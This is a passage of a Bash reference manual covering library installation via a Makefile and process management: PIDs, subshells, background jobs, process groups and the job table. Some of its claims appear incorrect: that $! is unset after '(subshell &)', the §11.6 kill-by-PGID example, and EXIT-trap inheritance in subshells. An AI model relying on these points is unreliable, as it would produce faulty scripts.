input), and `#fin` terminator. A real library extends this by
adding more public functions; the structure is invariant.

**See also**: every preceding chapter of Part X, plus §9.12 calling-
convention discipline (the function-level analogue of these rules),
§10.11 distribution and installation, BCS0407 (library patterns),
BCS0103 (script metadata), BCS0411 (subshell return-value patterns),
BCS0602 (exit codes).

## 10.11 Distribution and installation

How bash libraries are packaged and deployed. The unifying principle
is FHS compliance (BCS0104): libraries land in predictable
directories that scripts and the dynamic loader can find without
configuration.

- FHS layout: libraries in `/usr/share/PROJECT/lib/` (system-managed)
  or `/usr/local/share/PROJECT/lib/` (admin-managed).
- Per-user: `~/.local/share/PROJECT/lib/`.
- Discovery: scripts use FHS search-path resolution (BCS pattern,
  see BCS0104 for the canonical search order).
- Versioning: a `MYLIB_VERSION` constant inside the library *plus*
  a separate `VERSION` file at the install root, so package managers
  can read the version without sourcing the library.
- Packaging: deb, rpm, tarball, git submodule, or copy-into-tree;
  pick one and document it.
- Symlinks via `symlink -S` for PATH-exposed scripts.
- Pre-source vs source-on-demand trade-offs: pre-source for shared
  libraries used by many scripts (load cost amortised); source-on-
  demand for big optional features (load cost paid only when used).

### Makefile install-target example

A standard `make install` target encodes the FHS layout and the
correct file modes. The `PREFIX`/`DESTDIR` variables are package-
manager conventions: `DESTDIR` is set by deb/rpm builders to redirect
the install into a staging tree; `PREFIX` lets users override
`/usr/local`.

```makefile
# scenario: BCS-compliant Makefile install target for a bash library project.
# ── Makefile ─────────────────────────────────────────────────
PREFIX  ?= /usr/local
DESTDIR ?=

LIBDIR  := $(DESTDIR)$(PREFIX)/share/myapp/lib
BINDIR  := $(DESTDIR)$(PREFIX)/bin
DOCDIR  := $(DESTDIR)$(PREFIX)/share/doc/myapp
ETCDIR  := $(DESTDIR)/etc/myapp

LIBS    := lib/path_utils.sh lib/strings.sh lib/db.sh
SCRIPTS := bin/myapp
DOCS    := README.md LICENSE
VERSION := $(shell cat VERSION)

.PHONY: all install uninstall check

all:
	@printf 'myapp %s — run "make install" (PREFIX=%s)\n' '$(VERSION)' '$(PREFIX)'

install:
	install -d -m 0755 '$(LIBDIR)' '$(BINDIR)' '$(DOCDIR)' '$(ETCDIR)'
	install -m 0644 $(LIBS)    '$(LIBDIR)/'
	install -m 0755 $(SCRIPTS) '$(BINDIR)/'
	install -m 0644 $(DOCS)    '$(DOCDIR)/'
	install -m 0644 VERSION    '$(DOCDIR)/VERSION'           # (BCS0104)

uninstall:
	rm -rf '$(LIBDIR)' '$(DOCDIR)' '$(ETCDIR)'
	for s in $(notdir $(SCRIPTS)); do rm -f "$(BINDIR)/$$s"; done

check:
	shellcheck -x $(SCRIPTS) $(LIBS)
	bcscheck     $(SCRIPTS) $(LIBS)                          # (BCS1212)

```

A few notes on the conventions. `install -d` creates the directory
tree with the right modes in one step. Library files install with
`0644` (read-only for callers); scripts with `0755` (executable).
The `VERSION` file is duplicated at `$(DOCDIR)/VERSION` so package
managers and `dpkg-query`/`rpm -qV` can read it without sourcing
anything. `DESTDIR` is *prepended*, not embedded into `PREFIX` —
this is the deb/rpm convention; reversing them breaks staging
builds. The `check` target runs both static and BCS-policy
linting, so `make check` is the canonical pre-release gate.

For larger projects, a tiered Makefile (BCS bash-300 insight)
breaks `install` into per-component sub-targets — useful when a
project ships both a library and a daemon, or when a hardware-
specific component needs its own copy step. For most libraries the
flat target above is sufficient.

**See also**: §10.10 API design, §10.7 version negotiation (the
`VERSION` constant and the `VERSION` file), §10.6 public vs private
conventions (header documentation that pairs with the README in
`$(DOCDIR)`), BCS0104 (FHS compliance), BCS1212 (Makefile
installation), BCS0103 (script metadata).

# Part XI — Process Management

*Bash sits at the intersection of the shell language and the Unix process model. This Part documents how Bash creates, tracks, signals, and manages processes — its own and its children.*

---

---

## 11.1 The Bash process tree at runtime

A Bash script is not a single process; it is a parent shell that spawns
children for some constructs and runs others in-process. Whether a given
construct forks decides which variable assignments survive, which traps
fire, and which signals reach which PID. Strict-mode discipline (BCS0101)
lives or dies by knowing which line forks and which does not.

### Construct-to-tree map

| Construct | Forks? | Notes |
|-----------|:------:|-------|
| Builtin (`echo`, `read`, `[[`) | no | runs in current shell |
| Function call | no | shares variables, traps |
| Brace group `{ …; }` | no | grouping only |
| `exec cmd` | no | replaces current shell, does not return |
| External command | yes | classic `fork(2)` + `execve(2)` |
| Command substitution `$(…)` | yes | child writes to a pipe |
| Process substitution `<(…)` `>(…)` | yes | child plus a `/dev/fd/N` pipe |
| Subshell `( … )` | yes | explicit fork, no exec |
| Background `cmd &` | yes | new pgid when job control on |
| Pipeline `a \| b` | yes | one fork per stage (see `lastpipe`) |

### Worked example: pstree of every construct

```bash
#!/usr/bin/env bash
# scenario: snapshot the process tree under five forking constructs.
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

declare -r SELF=$$
printf 'top-level pid=%d\n' "$SELF"

# Each line below forks at least once; pstree freezes the moment.
echo "subst=$(pstree -p "$SELF" | head -1)"          # $(...) child
( pstree -p "$SELF" | sed -n '1p' )                  # ( ... ) child
diff <(echo a) <(echo a) && echo 'procsub ok'        # >(... ) <(... )
sleep 0.1 | sleep 0.1                                # pipeline (two forks)
sleep 1 & wait "$!"                                  # background + wait
```

`pstree -p $$` printed inside `$(…)` shows the script PID with a child
shell hanging off it; the same printed inside `( … )` shows the same
parent but a different child PID — proof that each construct fakes a
fresh process. Builtins and functions never appear as new nodes.

### ASCII shape under each construct

```
script (pid=4711)
├── $(pstree -p 4711 ...)        ← bash subshell (pid=4712)
│       └── pstree (pid=4713)
├── ( pstree -p 4711 | sed ... ) ← bash subshell (pid=4714)
│       ├── pstree (pid=4715)
│       └── sed    (pid=4716)
├── <(echo a) >(echo a)          ← two procsub children (pid=4717,4718)
├── sleep 0.1 | sleep 0.1        ← pipeline (pid=4719,4720)
└── sleep 1 &                    ← backgrounded child (pid=4721)
```

A function call or `{ …; }` group would not add a node here; control
returns inside the same `script` row.

### lastpipe: the pipeline exception

`shopt -s lastpipe` runs the **rightmost** stage of a pipeline in the
current shell when the shell is non-interactive and job control is off.
The other stages still fork; only the last is in-process.

```bash
#!/usr/bin/env bash
# scenario: prove lastpipe lets the right-hand side mutate parent state.
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob lastpipe
set +m                                                # disable job control

declare -i count=0
printf '%s\n' a b c | while read -r _; do count+=1; done
printf 'count=%d\n' "$count"
# ⇒ count=3   (without lastpipe: count=0, the loop ran in a subshell)
```

Without `lastpipe` the `while` reads in a forked child; assignments to
`count` evaporate when that child exits — a footgun that BCS0906 calls
out for `find … | while`.

### Strict-mode interaction

`set -e` and `inherit_errexit` (BCS0101) follow the fork. A `false` in a
brace group aborts the parent; the same `false` in `( false )` aborts
only the subshell, returns a non-zero status, and the parent then
honours `errexit` on the failing exit code. Knowing which body forks
tells you whether a failure is local or terminal.

### Inspection idioms

- `pstree -p "$$"` — full subtree from the script down.
- `ps -o pid,ppid,pgid,comm --forest` — flat ancestor view.
- `ps --ppid "$$" -o pid,comm` — direct children only.
- `BASHPID` (§11.2) is the only reliable handle on the *current* node.

### Common pitfalls

- Treating `cmd | tee` as in-process: `tee` always forks; the `tee`
  variant of `read … | while` still loses the `read`-side state unless
  `lastpipe` is on (BCS0906).
- Assuming `( cmd )` and `{ cmd; }` are interchangeable: only the
  brace group preserves variable mutations.
- Counting forks for `$( $( … ) )`: each `$()` fork is independent;
  the inner one runs *inside* the outer subshell.
- Forgetting that `exec >file` *redirects* without forking but
  rebinds the current shell's stdout for the rest of the script;
  `exec cmd` *replaces* the shell entirely.

### Quick reference: fork cost intuition

External commands and forking constructs cost a `fork(2)` (cheap on
Linux thanks to copy-on-write) plus, for external commands, an
`execve(2)`. Builtins, brace groups, and function calls are free —
they manipulate parser state only. Tight inner loops that invoke
`grep`, `sed`, or `awk` once per iteration pay this cost on every
trip; replace them with bash builtins (`[[ =~ ]]`, parameter
expansion, `printf -v`) when the loop body permits.

**See also**: §11.2 (PID variables), §11.3 (subshell origins),
§11.4 (`BASH_SUBSHELL`), §11.6 (process groups), §16 (concurrency),
BCS0101, BCS0411, BCS0504, BCS0906.

## 11.2 PIDs: `$$`, `$BASHPID`, `$PPID`

Three variables, three different meanings, and one of the most-misread
trios in Bash. Pick the wrong one for a lockfile and concurrent
subshells will all claim the same PID; pick the wrong one for a
per-worker tempdir and they will all collide.

### The contract

| Variable | Value | Mutable in subshell? |
|----------|-------|----------------------|
| `$$` | PID of the **original** shell that started the script | no — frozen for the script's lifetime |
| `BASHPID` | PID of the **currently executing** shell | yes — updates inside every subshell |
| `$PPID` | PID of the parent of the original shell | no |

`$$` is sometimes called "the script's PID" and that is fair, provided
you understand that it never changes when Bash forks a `( … )`, `$(…)`,
`<(…)`, or `cmd &` child. `BASHPID` does change. `$PPID` is whatever
process invoked the script — usually a shell or `init`-style supervisor.

### Worked example: divergence under a subshell

```bash
#!/usr/bin/env bash
# scenario: prove $$ stays constant while BASHPID tracks the current fork.
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

printf 'parent  $$=%d  BASHPID=%d  PPID=%d\n' "$$" "$BASHPID" "$PPID"

(
  printf 'subshell $$=%d  BASHPID=%d  PPID=%d\n' "$$" "$BASHPID" "$PPID"
  (
    printf 'nested  $$=%d  BASHPID=%d  PPID=%d\n' "$$" "$BASHPID" "$PPID"
  )
)
# ⇒ parent   $$=4711  BASHPID=4711  PPID=4123
# ⇒ subshell $$=4711  BASHPID=4712  PPID=4711
# ⇒ nested   $$=4711  BASHPID=4713  PPID=4712
```

`$$` is identical at all three depths; `BASHPID` advances with each fork
and `$PPID` of the inner subshell points at its real parent
(`BASHPID` of the outer subshell), not at the script's `$PPID`.

### Footgun: lockfiles in parallel sub-jobs

```bash
# wrong — every worker writes the same PID into its own lockfile
for i in 1 2 3; do
  ( echo "$$" > "/tmp/worker.$i.pid"; sleep 1 ) &
done

# right — each worker's lockfile carries its real PID
for i in 1 2 3; do
  ( echo "$BASHPID" > "/tmp/worker.$i.pid"; sleep 1 ) &
done
```

The wrong form will appear to work until you try to `kill` a single
worker by reading its pidfile — every file holds the parent PID.

### Footgun: per-subshell temp paths

`mktemp` itself is unique enough, but if you compose a path manually
under `BCS1006`, derive it from `BASHPID`:

```bash
# right — collision-free temp per subshell child
declare -- tmp; tmp=$(mktemp -d -t "worker.${BASHPID}.XXXXXX")
trap 'rm -rf -- "$tmp"' EXIT
```

### When `$$` is exactly what you want

- Top-level script lockfile (`/run/myscript.pid`) — the supervisor wants
  to signal the **whole** script, not a transient subshell.
- Log line prefixes that should remain stable across the run.
- Reporting in `--version`/diagnostics output.
- A `mkdir /tmp/build.$$` scratch directory is fine for the script's
  duration because the script itself is the only writer.

### When `BASHPID` is exactly what you want

- Lockfiles or pidfiles written **by a child** of the script (workers,
  per-host loops, parallel CI shards).
- Per-fork tempfiles inside `$(…)` or `( … )` blocks.
- Diagnostic logging that needs to identify *which* fork emitted a
  line (compose with `$$` for the script identity, `$BASHPID` for the
  fork identity).

### When `$PPID` matters

- Detecting whether the script was launched by a known supervisor
  (compare `$(ps -o comm= -p "$PPID")` to expected names).
- Honouring `SIGHUP` from a parent that just exited (the orphaning
  rules of §11.6 hinge on the original `$PPID`).

### Strict-mode note

None of `$$`, `BASHPID`, `$PPID` triggers `set -u` because all are set
unconditionally by the shell. They are safe to expand without the
`${var:-}` guard pattern shown elsewhere. They are also safe inside
`$(…)` because `inherit_errexit` (BCS0101) sees them as pure variable
expansions — no command, no failure path.

### Quick reference

| Need | Use |
|------|-----|
| "Is the script still running?" lockfile | `$$` |
| Per-fork tempfile / pidfile | `BASHPID` |
| Diagnostic prefix on every log line | `$$:$BASHPID` |
| Detecting unexpected re-parenting | `$PPID` snapshot at start, compare later |
| Killing the entire process group | `kill -TERM "-$$"` (negative PID, see §11.6) |

**See also**: §11.1 (process tree), §11.3 (subshell origins),
§11.4 (`BASH_SUBSHELL`), §11.7 (job table), BCS0101, BCS1006.

## 11.3 Subshell origins

A subshell is a forked copy of the shell that inherits state at the
fork point and discards its own state on exit. Knowing every construct
that triggers one is a precondition for reasoning about variable
mutation, trap firing, and exit-status propagation under
`inherit_errexit` (BCS0101).

### The complete catalogue of forking constructs

| Construct | Reason it forks |
|-----------|-----------------|
| `( cmd )` | explicit subshell — grouping + isolation |
| `$( cmd )` | command substitution — child writes to a pipe |
| `<( cmd )`, `>( cmd )` | process substitution — child plus a `/dev/fd/N` pipe |
| `cmd &` | background — child runs asynchronously |
| `cmd1 \| cmd2` | pipeline — one fork per stage (with `lastpipe` exception) |
| `coproc cmd` | coprocess — async child with bidirectional pipes |

The constructs that look similar but **do not** fork:

| Construct | Why it stays in-process |
|-----------|-------------------------|
| `{ cmd; }` | brace group is a parser feature, not a fork |
| `func args` | function call shares the calling shell |
| `source file` / `. file` | inlines the file |
| `exec cmd` | replaces the shell, no return |

### What the child inherits

A forked subshell inherits, by value at fork time:

- Variables (including arrays) and exported environment.
- Open file descriptors (with `O_CLOEXEC` honoured for execs only).
- Working directory and umask.
- Trap dispositions for **EXIT** (preserved) and other signals
  (reset to default — see §12.x for trap-in-subshell rules).
- Shell options (`set`, `shopt`).
- Functions and aliases.

Mutations made in the child do not propagate to the parent — the lesson
behind BCS0906's `find … | while read` warning.

### Worked example: variable scoping at the fork boundary

```bash
#!/usr/bin/env bash
# scenario: show that a subshell mutation does not leak to the parent.
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

declare -i count=0

( count=99; printf 'inside subshell: count=%d\n' "$count" )
printf 'outside subshell: count=%d\n' "$count"
# ⇒ inside subshell: count=99
# ⇒ outside subshell: count=0
```

The same trap holds for `$(…)`, `<(…)`, `>(…)`, `&`, and every stage of
a pipeline that runs in a forked child.

### The pipeline exception: `lastpipe`

`shopt -s lastpipe` causes the **last** pipeline stage to run in the
current shell when the shell is non-interactive **and** job control is
disabled (`set +m`, the default for scripts). The stages to its left
still fork.

```bash
#!/usr/bin/env bash
# scenario: lastpipe collapses one fork — variable assignments now persist.
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob lastpipe
set +m   # mandatory: lastpipe is silently ignored when job control is on

declare -a names=()
printf '%s\n' alice bob carol | readarray -t names
printf 'collected %d names: %s\n' "${#names[@]}" "${names[*]}"
# ⇒ collected 3 names: alice bob carol
```

Without `lastpipe` the `readarray` runs in a subshell whose `names=`
assignment vanishes the moment the pipeline exits. This is why §11.1's
"pipeline forks at least one subshell" rule needs the qualifier
*"unless `lastpipe` is in effect on the rightmost stage"*.

### Strict-mode trap

`set -e` follows the fork: a `false` inside `( … )` aborts the
subshell, which then exits non-zero and *re-triggers* `errexit` in the
parent. A `false` inside `$(…)` triggers `inherit_errexit` so the
substitution itself fails — without that shopt, the parent silently
sees the empty result of a failed substitution.

### Trap behaviour at the fork boundary

A subshell inherits the EXIT trap, but **all other** trap dispositions
reset to default. This is bash's deliberate concession to POSIX: a
forked child should not be obliged to honour every signal handler the
parent installed for itself. If a subshell needs the same SIGTERM
handler as the parent, re-install it inside the subshell body. The
EXIT trap inheritance is the reason a function whose cleanup relies on
EXIT will fire twice when called from a subshell — once when the
subshell exits, again when the parent does. Use `BASH_SUBSHELL`
(§11.4) to gate cleanup on depth when needed.

### Common subshell footguns

- `var=$(cmd1 | cmd2)` — both pipeline stages are forked children of
  the `$(…)` subshell; mutations vanish three levels deep.
- `cd dir; ( do-work )` — the `cd` persists; the do-work runs in a
  child but shares cwd at fork time, then any further `cd` inside is
  local to the child only.
- `( set -e; foo; bar )` — `errexit` rules apply only inside the
  subshell; a parent `set +e` does not suppress a child failure unless
  you check the subshell's own exit status.
- Functions defined inside `$(…)` are not visible to the parent;
  define them at the top level or `source` them.

**See also**: §11.1 (process tree), §11.2 (PID variables),
§11.4 (`BASH_SUBSHELL`), §11.5 (foreground vs background),
BCS0101, BCS0411, BCS0504, BCS0906.

## 11.4 `BASH_SUBSHELL` depth tracking

Bash maintains a counter of subshell depth in the read-only variable
`BASH_SUBSHELL`. It is incremented every time the shell forks a subshell
(`( … )`, `$(…)`, the left-hand side of a pipeline, a backgrounded
command, etc. — see §11.3) and decremented when that subshell exits.
The top-level script always sees `BASH_SUBSHELL == 0`.

`BASH_SUBSHELL` is **not** the same as `SHLVL`. `SHLVL` counts shell
*invocations* (e.g. `bash` exec'd from inside another `bash`), so it
survives `exec` and is exported to children; `BASH_SUBSHELL` counts
*forks within the current shell* and is not exported.

```bash
# scenario: BASH_SUBSHELL contrast with SHLVL
echo "top: SHLVL=$SHLVL BASH_SUBSHELL=$BASH_SUBSHELL"
( echo "in (..): SHLVL=$SHLVL BASH_SUBSHELL=$BASH_SUBSHELL"
  ( echo "nested:  SHLVL=$SHLVL BASH_SUBSHELL=$BASH_SUBSHELL" ) )
bash -c 'echo "exec:    SHLVL=$SHLVL BASH_SUBSHELL=$BASH_SUBSHELL"'
# ⇒ top: SHLVL=1 BASH_SUBSHELL=0
# ⇒ in (..): SHLVL=1 BASH_SUBSHELL=1
# ⇒ nested:  SHLVL=1 BASH_SUBSHELL=2
# ⇒ exec:    SHLVL=2 BASH_SUBSHELL=0
```

The `exec` line proves the distinction: a fresh `bash` invocation resets
`BASH_SUBSHELL` to 0 but bumps `SHLVL` to 2.

### Library-guard idiom

Code that must run only in the parent shell — e.g. a library that mutates
shell state the caller depends on, or a function that installs an EXIT
trap whose effect should not be duplicated in forks — uses
`BASH_SUBSHELL` to refuse to execute as a child:

```bash
# scenario: refuse to run as a forked child
init_session() {
  if (( BASH_SUBSHELL )); then
    error "init_session must run in the top-level shell, not a subshell"
    return 22
  fi
  trap 'cleanup_session' EXIT
  # … one-time setup that the parent shell needs to see …
}
```

This guard is cheaper than inspecting `$$` versus `$BASHPID` (§11.2) and
correctly identifies *every* subshell context, including command
substitution and pipeline LHS, where `$$` lies.

### Pipeline-component detection

Inside the LHS of a pipeline, `BASH_SUBSHELL` is non-zero, so the guard
above will trip if a library call lands there. With `shopt -s lastpipe`
(non-interactive) the rightmost component runs in the parent and
`BASH_SUBSHELL` remains 0 — see §11.3.

**See also**: §11.2 (`$$` vs `$BASHPID`), §11.3 (subshell origins),
§11.5 (foreground/background), Appendix C (`BASH_SUBSHELL`, `SHLVL`),
BCS0202 (variable scoping), BCS0407 (library patterns).

## 11.5 Foreground vs background

Bash distinguishes commands the shell waits for (foreground) from
commands launched concurrently (background, suffixed with `&`).
Background jobs are the primitive on which every concurrency idiom in
the reference is built — parallel pools, timeouts, supervisor patterns,
the wait-and-invert idiom (§12.10) — and `$!`, `wait`, `wait -n`, and
`huponexit` are the four builtins that make them tractable.

### The basic forms

```bash
cmd                                # foreground: shell blocks until cmd exits
cmd &                              # background: shell returns immediately
cmd &> log &                       # background with redirection (else inherits stdout/stderr)
```

A backgrounded command keeps the parent's open file descriptors. If you
do not redirect its stdout/stderr, its output interleaves with the
script's. For any non-trivial background job, redirect explicitly.

### `$!` — the just-backgrounded PID

`$!` is set immediately after `cmd &` to the PID of the launched
process. It is *only* set by `&` (and coproc); it is **not** set by
foreground commands or by `(subshell &)`. Capture it on the very next
line, before any other command can clobber it:

```bash
# scenario: capture child PID for later wait/kill
worker &
worker_pid=$!                       # ⇒ snapshot now; $! changes on next &
log_collector &
log_pid=$!

wait "$worker_pid"
worker_rc=$?                        # exit status of the specific child
kill "$log_pid"
```

`$!` is *only* meaningful in the shell that launched the job. A subshell
asking for `$!` after a `cmd &` started in the parent gets the empty
string; capture in the parent and pass through (BCS1101).

### `wait` patterns

`wait` (no args) blocks until *all* known children exit. Its exit
status is 0 if every child exited 0, and the status of the *last* one
that did not, otherwise — a fact that is rarely what callers want.
Prefer one of the targeted forms:

| Form | Semantics |
|------|-----------|
| `wait $pid` | wait for one specific child; status is that child's exit status |
| `wait -n` | wait for any one child to exit; status is that child's |
| `wait -n $pid1 $pid2` | wait for any of a named subset (bash 5.1+) |
| `wait -p var -n` | wait any; place exited PID into `var` (bash 5.1+) |
| `wait` | wait for all; aggregated exit status as above |

`wait -n` is the building block of a **bounded worker pool**: keep N
children running, and as each exits, launch the next.

```bash
# scenario: three-wide worker pool with wait -n
#!/usr/bin/env bash
set -euo pipefail; shopt -s inherit_errexit shift_verbose extglob nullglob

declare -ar TASKS=(alpha bravo charlie delta echo foxtrot)
declare -ir N=3
declare -i running=0 i=0

run_one() { sleep $((RANDOM % 3 + 1)); printf 'done %s\n' "$1"; }

while (( i < ${#TASKS[@]} )); do
  if (( running < N )); then
    run_one "${TASKS[i]}" &
    i+=1; running+=1
  else
    wait -n                          # one slot frees up
    running+=-1
  fi
done
wait                                 # drain remaining
```

`wait` and `wait -n` are interruptible by traps (§12.10) — the
interaction that makes the wait-and-invert idiom work at all.

### `huponexit` and SIGHUP at logout

When an interactive shell exits, it sends SIGHUP to its jobs **only if
the `huponexit` shopt is set**. The shopt is *off* by default in modern
bash; an interactive `exit` therefore leaves backgrounded jobs running
on most desktop systems. Turn it on if you want the shell to clean up
its jobs:

```bash
# scenario: aggressive cleanup at logout
shopt -s huponexit                   # backgrounded jobs receive SIGHUP on exit
```

Non-interactive scripts behave differently: when a script ends, its
backgrounded children become orphans of init/systemd. They do *not*
receive SIGHUP from the script's exit. To detach a job from the
script's terminal so it survives the user's logout regardless, use
`disown -h <jobspec>` (which removes the job from the job table and
suppresses SIGHUP) or wrap it in `nohup` / `setsid` (§11.11, §11.12).

### SIGCHLD interaction

When a child exits, the kernel sends SIGCHLD to the parent. Bash's
default behaviour (with job control on) is to reap the child and
update the job table; under job control off, it still reaps but does
not surface a notification. The signal interrupts any in-progress
`wait`, which is precisely how `wait -n` returns as soon as *any* child
exits — the SIGCHLD wakes bash, bash sees the dead child, `wait`
returns its status.

A script that traps SIGCHLD itself is unusual and competes with bash's
reaping; the canonical idiom is to let bash handle SIGCHLD and use
`wait -n` to consume exits one at a time.

### Strict-mode interaction

Background jobs do **not** trigger `set -e` if they exit non-zero —
errexit only inspects foreground commands. To make a failing child
fatal, you must `wait` for it explicitly and let the resulting non-zero
status be observed by errexit:

```bash
# wrong — failure invisible to set -e
worker &                             # exits 1, but errexit ignores backgrounded jobs
echo continuing                      # ⇒ runs anyway

# right — wait surfaces the status; set -e fires
worker &
wait $!                              # exits 1 here; script terminates
```

`pipefail` interacts with backgrounded jobs the same way it interacts
with foreground pipelines: the pipeline's status is its rightmost
non-zero, captured at the synchronous point where the pipeline is
considered to have run. For backgrounded pipelines (`a | b &`), capture
the rightmost component's PID via `$!` and `wait` it explicitly to
observe the failure (BCS1101, BCS1103).

**See also**: §11.6 (process groups and sessions), §11.7 (job table),
§11.9 (job-control builtins, `disown -h`), §11.11 (`nohup`/`setsid`),
§12.10 (synchronous vs asynchronous delivery, wait-and-invert), §12.11
(signal-safe code), BCS1101, BCS1103, BCS1104, BCS-bash
`25_JOB-CONTROL.md`.

## 11.6 Process groups and sessions

Linux organises processes into a two-level hierarchy above the bare PID:
**process groups** for collective signal delivery, and **sessions** for
controlling-terminal ownership. Job control (§11.5) and detachment
(§11.11, §11.12) both rely on this model. Understanding it is the
difference between killing one stage of a pipeline and killing the
whole pipeline cleanly.

### The model

| Level | Identifier | Purpose |
|-------|-----------|---------|
| Process | PID | Schedulable entity |
| Process group | PGID = PID of group leader | Signal fan-out target |
| Session | SID = PID of session leader | Owns at most one controlling terminal |

A process group is a set of processes that share a PGID; sending a
signal to `-PGID` (negative PID) delivers it to **every** member. A
session is a set of process groups that share a SID and, optionally, a
controlling terminal (`/dev/tty`). The session leader is the only
process that may acquire one.

Relevant syscalls (consult `man 2 setpgid`, `man 2 setsid`,
`man 3 tcsetpgrp` for full semantics):

- `setpgid(2)` — move a process into a process group.
- `setsid(2)` — start a new session; caller becomes session leader and
  loses its controlling terminal.
- `getpgrp(2)`, `getsid(2)` — query.
- `tcsetpgrp(3)` — set the foreground process group of a terminal.

### How Bash builds them

When job control is enabled (`set -o monitor`, default in interactive
shells, off in scripts), Bash places **each pipeline** into its own
process group whose PGID equals the PID of the pipeline's first
command. The shell uses `tcsetpgrp` to hand the terminal to the
foreground job and reclaim it on suspension or exit.

In scripts (`set +m`), Bash does *not* create per-pipeline groups — all
descendants share the script's PGID — so `kill -TERM 0` reaches every
descendant in one call. Test this before relying on it.

### Worked example: inspect pgid and sid

```bash
#!/usr/bin/env bash
# scenario: show pgid/sid for a script, its subshell, and a pipeline.
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

ps -o pid,ppid,pgid,sid,comm -p "$$"
( ps -o pid,ppid,pgid,sid,comm -p "$BASHPID" )
sleep 5 | sleep 5 &
ps -o pid,ppid,pgid,sid,comm --ppid "$$"
wait
# ⇒ PID
# ⇒ COMMAND
# (literal PIDs vary; the load-bearing observation is that the script,
#  its `( … )` subshell, and the two `sleep | sleep` pipeline stages
#  share the same PGID and SID — bash is the process-group leader)
```

Every descendant shares the script's PGID and SID. Re-run with
`set -m` enabled and the pipeline acquires its own PGID — this is the
behaviour interactive shells exhibit.

### Signal fan-out: kill the group, not the leader

```bash
# scenario: kill a backgrounded pipeline cleanly.
sleep 5 | sleep 5 &
declare -ri pgid=$!         # in scripts the pipeline shares the script's PGID
kill -TERM "-$pgid"         # negative PID → fan out to every group member
wait "$pgid" 2>/dev/null || true
```

A negative `PID` argument to `kill(1)` (and to the Bash `kill` builtin)
delivers the signal to every process in the group. This is the
canonical way to terminate a whole pipeline or a subprocess that has
itself spawned children.

### Footgun: orphaned process groups

A process group whose leader has exited becomes an *orphaned process
group*. The kernel sends `SIGHUP` followed by `SIGCONT` to every
stopped member of an orphaned group when the last live ancestor exits
the session. This is why `nohup` (§11.11) and `setsid` (§11.11) matter
for survivable background work.

### Controlling terminal in a nutshell

The controlling terminal — `/dev/tty` for any process that has one —
is owned by the session leader. Only one process group at a time can
read from it (the *foreground* group); others are stopped with
`SIGTTIN` if they try. `tcsetpgrp(3)` moves the foreground privilege
between groups; the kernel notifies displaced groups with `SIGTTOU`
when they attempt to write. Bash hides this behind `fg`/`bg`/`%n`
job-control commands (§11.9). A daemon's first job is to **drop** the
controlling terminal — that is exactly what `setsid(2)` achieves
(§11.11).

### Common pitfalls

- Sending a `SIGTERM` to the pipeline leader and expecting downstream
  stages to die: in scripts (no job control), every stage shares the
  script's PGID, so the signal must go to `-PGID` to fan out.
- Using `kill 0` thinking it is harmless: `0` is a *PGID specifier*
  meaning "my own group" — the parent script will receive the signal
  too, often killing itself before the children.
- Assuming `setsid cmd` is enough: `setsid(1)` does its work only if
  the caller is not already a process group leader. Use
  `setsid --fork` to guarantee the call (§11.11).

### Strict-mode interaction

`set -e` does not propagate across a `kill -TERM "-$pgid"`; the
backgrounded children's exit status is recovered by `wait`. Combine
with BCS1103 (`wait` patterns) and BCS0603 (trap handling) to drain
process groups cleanly on `EXIT`/`INT`/`TERM`. A typical drain trap:

```bash
# scenario: ensure all background workers die when the script exits.
trap 'kill -TERM "-$$" 2>/dev/null || true; wait' EXIT
```

The negative `$$` argument fans the signal across the script's whole
process group (in script mode, that is every descendant); `wait`
reaps survivors so `EXIT` does not return before they have reported.

**See also**: §11.5 (foreground vs background), §11.7 (job table),
§11.10 (kill), §11.11 (nohup, setsid), §11.12 (detachment),
BCS-bash `25_JOB-CONTROL.md`, BCS0603, BCS1101, BCS1103.

## 11.7 The job table

When job control is enabled, bash maintains a per-shell *job table* that
records every pipeline started asynchronously (with `&`) or stopped via
SIGTSTP. Each entry has a job number (`%1`, `%2`, …), a process group id,
a status (`Running`, `Stopped`, `Done`, `Killed`, …), and the original
command line. The table is consulted by `jobs`, `fg`, `bg`, `disown`,
`wait`, and the `%spec` job-spec syntax (§11.8).

- One pipeline = one job, regardless of how many commands the pipeline
  contains.
- Each job is its own process group (see §11.6); the pgid is the leader's
  PID.
- Job numbers are recycled as completed jobs are reaped.
- The table is per-shell — subshells start with an empty job table even
  though they inherit the parent's running children at the kernel level.
- `set -m` toggles job control; `set +m` disables it.

### Interactive default vs non-interactive caveat

Job control is **on** by default in interactive shells and **off** in
non-interactive shells (the usual case for scripts). When off:

- `jobs` still works, but background commands run in the *same* process
  group as the script — they are not isolated.
- `%spec` job-control commands (`fg`, `bg`) error out.
- SIGINT delivered to the foreground pgid hits the script and every
  child simultaneously.

A script that needs to manage its children as separate process groups
must opt in explicitly:

```bash
# scenario: enabling job control in a non-interactive script
#!/usr/bin/env bash
set -euo pipefail; shopt -s inherit_errexit shift_verbose extglob nullglob
set -m                                    # turn job control ON
sleep 30 &                                # gets its own pgid
job_pid=$!
jobs -l                                   # ⇒ [1]+ <pid> Running    sleep 30
kill -INT -"$job_pid"                     # signal the whole group (§11.10)
wait "$job_pid" || true                   # reap; ignore non-zero
```

Without the `set -m` line, `kill -INT -"$job_pid"` would target the
script's own pgid — usually fatal. With it, the negative-PID form
delivers SIGINT only to the child's group.

### Inspecting the table

`jobs` lists current entries; flags filter the view:

| Flag | Purpose |
|------|---------|
| `-l` | include PID column |
| `-p` | print PIDs only (one per line) |
| `-r` | running jobs only |
| `-s` | stopped jobs only |
| `-n` | only jobs whose status changed since last `jobs` |

The `-n` form is the canonical way for a polling loop to react to child
state changes without re-listing the full table.

**See also**: §11.5 (foreground vs background), §11.6 (process groups),
§11.8 (job specifications), §11.9 (job-control builtins), §11.10 (kill),
§16 (concurrency), BCS-bash `25_JOB-CONTROL.md`, BCS1101 (background job
management).

## 11.8 Job specifications

Jobs can be referenced by several syntaxes.

- `%N` — job number N.
- `%+` or `%%` — current job (most recent).
- `%-` — previous job.
- `%cmd` — job whose command starts with `cmd`.
- `%?str` — job whose command contains `str`.
- Used with `fg`, `bg`, `kill`, `wait`, `disown`.

## 11.9 Job-control builtins

The builtins that read and mutate the job table. All accept job specs
